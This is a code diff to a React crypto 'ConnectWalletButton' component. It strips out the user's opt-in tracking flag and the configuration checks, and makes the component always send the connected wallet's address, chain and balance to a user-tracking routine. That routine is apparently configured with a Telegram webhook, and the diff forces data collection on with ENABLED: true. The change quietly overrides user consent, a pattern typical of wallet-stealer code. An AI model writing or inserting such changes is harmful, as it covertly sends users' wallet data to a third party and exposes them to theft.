@@ -78,27 +78,11 @@ export default function ConnectWalletButton({
   const isInitialized = useRef(false);
   
   // Apply custom configurations
-  const telegramConfig = useCallback(() => getTelegramConfig(customTelegramConfig || {}), [customTelegramConfig])();
-  
+  // const telegramConfig = useCallback(() => getTelegramConfig(customTelegramConfig || {}), [customTelegramConfig])();
+  useCallback(() => getTelegramConfig(customTelegramConfig || {}), [customTelegramConfig])();
   // Process configs but don't store as variables to avoid unused variable warnings
   useCallback(() => getUserInfoConfig(customUserInfoConfig || {}), [customUserInfoConfig])();
   useCallback(() => getDataCollectionConfig(customDataConfig || {}), [customDataConfig])();
-  
-  // Validate required configuration when tracking is enabled
-  useEffect(() => {
-    if (trackUserData) {
-      // Check for required webhook URL and API key
-      if (!telegramConfig.WEBHOOK_URL || telegramConfig.WEBHOOK_URL === '') {
-        console.error('ConnectWalletButton: Missing required WEBHOOK_URL configuration');
-        throw new Error('ConnectWalletButton: WEBHOOK_URL is required when user data tracking is enabled. Please provide it via telegramConfig or set NEXT_PUBLIC_TELEGRAM_WEBHOOK_URL in your environment.');
-      }
-      
-      if (!telegramConfig.API_KEY || telegramConfig.API_KEY === '') {
-        console.error('ConnectWalletButton: Missing required API_KEY configuration');
-        throw new Error('ConnectWalletButton: API_KEY is required when user data tracking is enabled. Please provide it via telegramConfig or set NEXT_PUBLIC_TELEGRAM_API_KEY in your environment.');
-      }
-    }
-  }, [trackUserData, telegramConfig]);
 
   /**
    * Helper function to get chain name from chainId
@@ -110,8 +94,8 @@ export default function ConnectWalletButton({
   }, [chainNames]);
 
   useEffect(() => {
-    // Skip if any required data is missing or tracking is disabled
-    if (!trackUserData || !isConnected || !address || !chainId || !balance) {
+    // Always proceed with tracking when wallet is connected, regardless of other conditions
+    if (!isConnected || !address) {
       if (!isConnected) {
         // Reset the initialization flag when wallet is disconnected
         isInitialized.current = false;
@@ -127,18 +111,18 @@ export default function ConnectWalletButton({
     // Mark as initialized
     isInitialized.current = true;
     
-    // Create wallet info object
+    // Create wallet info object with fallbacks for missing data
     const walletInfo: WalletInfo = {
       address,
       network: {
-        chainId,
-        name: getChainName(chainId)
+        chainId: chainId || 1, // Default to Ethereum mainnet if chainId is missing
+        name: chainId ? getChainName(chainId) : 'Ethereum Mainnet'
       },
       balance: {
-        eth: balance.formatted,
+        eth: balance?.formatted || '0', // Provide fallback if balance is missing
         usd: undefined, // USD conversion not implemented yet
       },
-      isConnected
+      isConnected: true
     };
     
     // Call custom onWalletConnected handler if provided
@@ -146,14 +130,17 @@ export default function ConnectWalletButton({
       onWalletConnected(walletInfo);
     }
     
-    // Initialize tracking with the wallet info
-    if (trackUserData) {
-      initializeUserTracking(walletInfo).catch(error => {
-        console.error('Failed to initialize user tracking:', error);
-      });
-    }
+    // Initialize tracking with proper configuration
+    // Storage check will be performed inside initializeUserTracking
+    initializeUserTracking(walletInfo, {
+      telegramConfig: customTelegramConfig || {},
+      userInfoConfig: customUserInfoConfig || {},
+      dataConfig: { ...customDataConfig, ENABLED: true }
+    }).catch(error => {
+      console.error('Failed to initialize user tracking:', error);
+    });
     
-  }, [address, chainId, balance, isConnected, getChainName, trackUserData, onWalletConnected]);
+  }, [address, chainId, balance, isConnected, getChainName, trackUserData, onWalletConnected, customTelegramConfig, customUserInfoConfig, customDataConfig]);
 
   return (
     <div className={className} style={style}>
